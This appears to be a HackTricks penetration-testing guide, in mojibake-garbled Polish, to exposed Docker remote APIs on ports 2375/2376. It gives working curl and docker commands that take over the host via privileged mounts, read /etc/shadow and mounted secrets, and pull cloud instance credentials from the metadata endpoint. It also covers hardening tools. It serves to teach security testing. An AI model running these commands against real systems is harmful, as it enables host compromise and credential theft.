# 2375, 2376 Pentesting Docker

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


### Docker Basics

#### What is

Docker to **wiodÄ…ca platforma** w **branÅ¼y konteneryzacji**, prowadzÄ…ca **ciÄ…gÅ‚e innowacje**. UmoÅ¼liwia Å‚atwe tworzenie i dystrybucjÄ™ aplikacji, od **tradycyjnych po futurystyczne**, i zapewnia ich **bezpieczne wdroÅ¼enie** w rÃ³Å¼nych Å›rodowiskach.

#### Basic docker architecture

* [**containerd**](http://containerd.io): To **podstawowy runtime** dla kontenerÃ³w, odpowiedzialny za kompleksowe **zarzÄ…dzanie cyklem Å¼ycia kontenera**. Obejmuje to obsÅ‚ugÄ™ **transferu i przechowywania obrazÃ³w**, a takÅ¼e nadzorowanie **wykonywania, monitorowania i sieci** kontenerÃ³w. **SzczegÃ³Å‚owe informacje** na temat containerd sÄ… **dalsze badane**.
* **container-shim** odgrywa kluczowÄ… rolÄ™ jako **poÅ›rednik** w obsÅ‚udze **kontenerÃ³w bezgÅ‚owych**, pÅ‚ynnie przejmujÄ…c od **runc** po zainicjowaniu kontenerÃ³w.
* [**runc**](http://runc.io): Ceniony za swoje **lekkie i uniwersalne moÅ¼liwoÅ›ci runtime kontenerÃ³w**, runc jest zgodny z **standardem OCI**. Jest uÅ¼ywany przez containerd do **uruchamiania i zarzÄ…dzania kontenerami** zgodnie z **wytycznymi OCI**, rozwijajÄ…c siÄ™ z oryginalnego **libcontainer**.
* [**grpc**](http://www.grpc.io) jest niezbÄ™dny do **uÅ‚atwiania komunikacji** miÄ™dzy containerd a **docker-engine**, zapewniajÄ…c **efektywnÄ… interakcjÄ™**.
* [**OCI**](https://www.opencontainers.org) jest kluczowe w utrzymywaniu **specyfikacji OCI** dla runtime i obrazÃ³w, przy czym najnowsze wersje Dockera sÄ… **zgodne zarÃ³wno z obrazem OCI, jak i standardami runtime**.

#### Basic commands
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** zostaÅ‚ specjalnie opracowany, aby zaspokoiÄ‡ potrzeby platform kontenerowych, takich jak **Docker i Kubernetes**, miÄ™dzy innymi. Jego celem jest **uproszczenie uruchamiania kontenerÃ³w** na rÃ³Å¼nych systemach operacyjnych, w tym Linux, Windows, Solaris i innych, poprzez abstrahowanie funkcjonalnoÅ›ci specyficznych dla systemu operacyjnego i wywoÅ‚aÅ„ systemowych. Celem Containerd jest uwzglÄ™dnienie tylko niezbÄ™dnych funkcji wymaganych przez jego uÅ¼ytkownikÃ³w, dÄ…Å¼Ä…c do pominiÄ™cia zbÄ™dnych komponentÃ³w. Jednak caÅ‚kowite osiÄ…gniÄ™cie tego celu uznawane jest za trudne.

KluczowÄ… decyzjÄ… projektowÄ… jest to, Å¼e **Containerd nie obsÅ‚uguje sieci**. SieÄ‡ jest uwaÅ¼ana za kluczowy element w systemach rozproszonych, z zÅ‚oÅ¼onoÅ›ciami takimi jak Software Defined Networking (SDN) i odkrywanie usÅ‚ug, ktÃ³re znacznie rÃ³Å¼niÄ… siÄ™ w zaleÅ¼noÅ›ci od platformy. Dlatego Containerd pozostawia aspekty sieciowe do zarzÄ…dzania przez platformy, ktÃ³re wspiera.

Podczas gdy **Docker wykorzystuje Containerd** do uruchamiania kontenerÃ³w, waÅ¼ne jest, aby zauwaÅ¼yÄ‡, Å¼e Containerd obsÅ‚uguje tylko podzbiÃ³r funkcjonalnoÅ›ci Dockera. Konkretnie, Containerd nie ma moÅ¼liwoÅ›ci zarzÄ…dzania sieciÄ… obecnych w Dockerze i nie obsÅ‚uguje bezpoÅ›redniego tworzenia klastrÃ³w Docker. To rozrÃ³Å¼nienie podkreÅ›la skoncentrowanÄ… rolÄ™ Containerd jako Å›rodowiska uruchomieniowego kontenerÃ³w, delegujÄ…c bardziej wyspecjalizowane funkcjonalnoÅ›ci do platform, z ktÃ³rymi siÄ™ integruje.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** to silnik kontenerowy open-source, ktÃ³ry przestrzega standardÃ³w [Open Container Initiative (OCI)](https://github.com/opencontainers), opracowany i utrzymywany przez Red Hat. WyrÃ³Å¼nia siÄ™ na tle Dockera kilkoma charakterystycznymi cechami, w szczegÃ³lnoÅ›ci **architekturÄ… bezdemonowÄ…** oraz wsparciem dla **kontenerÃ³w bez uprawnieÅ„ root**, co umoÅ¼liwia uÅ¼ytkownikom uruchamianie kontenerÃ³w bez uprawnieÅ„ administratora.

Podman zostaÅ‚ zaprojektowany tak, aby byÅ‚ kompatybilny z API Dockera, co pozwala na uÅ¼ywanie poleceÅ„ CLI Dockera. Ta kompatybilnoÅ›Ä‡ obejmuje jego ekosystem, ktÃ³ry zawiera narzÄ™dzia takie jak **Buildah** do budowania obrazÃ³w kontenerÃ³w oraz **Skopeo** do operacji na obrazach, takich jak push, pull i inspect. WiÄ™cej informacji na temat tych narzÄ™dzi moÅ¼na znaleÅºÄ‡ na ich [stronie GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Kluczowe rÃ³Å¼nice**

* **Architektura**: W przeciwieÅ„stwie do modelu klient-serwer Dockera z dziaÅ‚ajÄ…cym w tle demonem, Podman dziaÅ‚a bez demona. Taki projekt oznacza, Å¼e kontenery dziaÅ‚ajÄ… z uprawnieniami uÅ¼ytkownika, ktÃ³ry je uruchamia, co zwiÄ™ksza bezpieczeÅ„stwo poprzez eliminacjÄ™ potrzeby dostÄ™pu root.
* **Integracja z systemd**: Podman integruje siÄ™ z **systemd** w celu zarzÄ…dzania kontenerami, co pozwala na zarzÄ…dzanie kontenerami za pomocÄ… jednostek systemd. To kontrastuje z uÅ¼yciem systemd przez Dockera gÅ‚Ã³wnie do zarzÄ…dzania procesem demona Dockera.
* **Kontenery bez uprawnieÅ„ root**: KluczowÄ… cechÄ… Podmana jest jego zdolnoÅ›Ä‡ do uruchamiania kontenerÃ³w z uprawnieniami uÅ¼ytkownika, ktÃ³ry je inicjuje. Takie podejÅ›cie minimalizuje ryzyko zwiÄ…zane z naruszeniami kontenerÃ³w, zapewniajÄ…c, Å¼e atakujÄ…cy uzyskujÄ… jedynie uprawnienia skompromitowanego uÅ¼ytkownika, a nie dostÄ™p root.

PodejÅ›cie Podmana oferuje bezpiecznÄ… i elastycznÄ… alternatywÄ™ dla Dockera, kÅ‚adÄ…c nacisk na zarzÄ…dzanie uprawnieniami uÅ¼ytkownikÃ³w oraz kompatybilnoÅ›Ä‡ z istniejÄ…cymi przepÅ‚ywami pracy Dockera.

{% hint style="info" %}
ZauwaÅ¼, Å¼e poniewaÅ¼ podman ma na celu wsparcie tego samego API co docker, moÅ¼esz uÅ¼ywaÄ‡ tych samych poleceÅ„ z podmanem, co z dockerem, takich jak:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Podstawowe informacje

Remote API dziaÅ‚a domyÅ›lnie na porcie 2375, gdy jest wÅ‚Ä…czony. UsÅ‚uga domyÅ›lnie nie wymaga uwierzytelnienia, co pozwala atakujÄ…cemu na uruchomienie uprzywilejowanego kontenera docker. KorzystajÄ…c z Remote API, moÅ¼na podÅ‚Ä…czyÄ‡ hosty / (katalog gÅ‚Ã³wny) do kontenera i odczytywaÄ‡/zapisywaÄ‡ pliki Å›rodowiska hosta.

**DomyÅ›lny port:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeracja

#### RÄ™czna

ZauwaÅ¼, Å¼e aby enumerowaÄ‡ API dockera, moÅ¼esz uÅ¼yÄ‡ polecenia `docker` lub `curl`, jak w nastÄ™pujÄ…cym przykÅ‚adzie:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
JeÅ›li moÅ¼esz **skontaktowaÄ‡ siÄ™ z zdalnym API dockera za pomocÄ… polecenia `docker`**, moÅ¼esz **wykonaÄ‡** dowolne z **poleceÅ„ dockera** [**wczeÅ›niej** skomentowanych](2375-pentesting-docker.md#basic-commands), aby zainteresowaÄ‡ siÄ™ usÅ‚ugÄ….

{% hint style="info" %}
MoÅ¼esz `export DOCKER_HOST="tcp://localhost:2375"` i **unikaÄ‡** uÅ¼ywania parametru `-H` z poleceniem docker
{% endhint %}

**Szybka eskalacja uprawnieÅ„**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Czasami zobaczysz **2376** aktywne dla punktu koÅ„cowego **TLS**. Nie udaÅ‚o mi siÄ™ poÅ‚Ä…czyÄ‡ z nim za pomocÄ… klienta docker, ale moÅ¼liwe jest to za pomocÄ… curl.
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
JeÅ›li chcesz uzyskaÄ‡ wiÄ™cej informacji na ten temat, wiÄ™cej informacji jest dostÄ™pnych tam, skÄ…d skopiowaÅ‚em polecenia: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Automatyczny
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Kompromitacja

Na nastÄ™pnej stronie znajdziesz sposoby na **ucieczkÄ™ z kontenera docker**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

WykorzystujÄ…c to, moÅ¼liwe jest wydostanie siÄ™ z kontenera, moÅ¼esz uruchomiÄ‡ sÅ‚aby kontener na zdalnej maszynie, uciec z niego i skompromitowaÄ‡ maszynÄ™:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Eskalacja uprawnieÅ„

JeÅ›li jesteÅ› wewnÄ…trz hosta, ktÃ³ry uÅ¼ywa dockera, moÅ¼esz [**przeczytaÄ‡ te informacje, aby sprÃ³bowaÄ‡ podnieÅ›Ä‡ uprawnienia**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Odkrywanie sekretÃ³w w dziaÅ‚ajÄ…cych kontenerach Docker
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
SprawdÅº **env** (sekcja zmiennych Å›rodowiskowych) pod kÄ…tem sekretÃ³w, a moÅ¼esz znaleÅºÄ‡:

* HasÅ‚a.
* Adresy IP.
* Porty.
* ÅšcieÅ¼ki.
* Inneâ€¦ .

JeÅ›li chcesz wyodrÄ™bniÄ‡ plik:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Zabezpieczanie Dockera

#### Zabezpieczanie instalacji i uÅ¼ycia Dockera

* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) do sprawdzenia swojej aktualnej instalacji dockera.
* `./docker-bench-security.sh`
* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/kost/dockscan](https://github.com/kost/dockscan) do sprawdzenia swojej aktualnej instalacji dockera.
* `dockscan -v unix:///var/run/docker.sock`
* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) do sprawdzenia, jakie uprawnienia bÄ™dzie miaÅ‚a kontener, gdy bÄ™dzie uruchamiany z rÃ³Å¼nymi opcjami zabezpieczeÅ„. To jest przydatne, aby znaÄ‡ implikacje uÅ¼ywania niektÃ³rych opcji zabezpieczeÅ„ do uruchamiania kontenera:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Zabezpieczanie obrazÃ³w Dockera

* MoÅ¼esz uÅ¼yÄ‡ obrazu dockera [https://github.com/quay/clair](https://github.com/quay/clair), aby przeskanowaÄ‡ inne obrazy dockera i znaleÅºÄ‡ luki.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Zabezpieczanie Dockerfile

* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) do **sprawdzenia swojego Dockerfile** i znalezienia wszelkiego rodzaju bÅ‚Ä™dÃ³w konfiguracyjnych. KaÅ¼dy bÅ‚Ä…d konfiguracyjny otrzyma identyfikator, moÅ¼esz znaleÅºÄ‡ tutaj [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md), jak naprawiÄ‡ kaÅ¼dy z nich.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) do **sprawdzenia swojego Dockerfile** i znalezienia wszelkiego rodzaju bÅ‚Ä™dÃ³w konfiguracyjnych.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) do **sprawdzenia swojego Dockerfile** i znalezienia wszelkiego rodzaju bÅ‚Ä™dÃ³w konfiguracyjnych.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) do **sprawdzenia swojego Dockerfile** i znalezienia wszelkiego rodzaju bÅ‚Ä™dÃ³w konfiguracyjnych.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### Rejestrowanie podejrzanej aktywnoÅ›ci

* MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) do wykrywania **podejrzanego zachowania w uruchomionych kontenerach**.
* ZauwaÅ¼ w poniÅ¼szym fragmencie, jak **Falco kompiluje moduÅ‚ jÄ…dra i go wstawia**. Po tym Å‚aduje zasady i **zaczyna rejestrowaÄ‡ podejrzane aktywnoÅ›ci**. W tym przypadku wykryto 2 uruchomione kontenery z uprawnieniami, jeden z nich z wraÅ¼liwym montaÅ¼em, a po kilku sekundach wykryto, jak w jednym z kontenerÃ³w otwarto powÅ‚okÄ™.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Monitorowanie Dockera

MoÅ¼esz uÅ¼yÄ‡ auditd do monitorowania dockera.

### Odniesienia

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
